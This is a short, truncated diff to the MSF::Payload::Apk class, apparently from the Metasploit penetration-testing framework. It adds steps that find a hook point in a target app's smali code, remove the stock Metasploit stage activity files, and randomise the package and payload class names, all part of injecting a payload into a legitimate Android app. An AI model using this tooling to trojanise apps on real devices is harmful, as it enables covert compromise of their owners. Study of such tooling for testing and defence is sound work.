@@ -171,5 +171,22 @@ class MSF::Payload::Apk
               break
           end
       end
-            
+      
+      unless hooksmali
+          raise RuntimeError, "Unable to find hook point in #{smalifile}\n"
+      end
+      
+      entrypoint = 'return-void'
+      unless hooksmali.include? entrypoint
+          raise RuntimeError, "unable to find hookable function in #{smalifile}\n"
+      end
+
+      FileUtils.rm "#{tempdir}/payload/smali/com/metasploit/stage/MainActivity.smali"
+      FileUtils.rm Dir.glob("#{tempdir}/payload/smali/com/metasploit/stage/R*.smali")      
+
+      package = amanifest.xpath("//manifest").first['package']
+      package = package + ".#{Rex::Text::rand_text_alpha_lower(5)}"
+      classes = {}
+      classes['Payload'] = Rex::Text::rand_text_alpha_lower(5).capitalize
+       
             
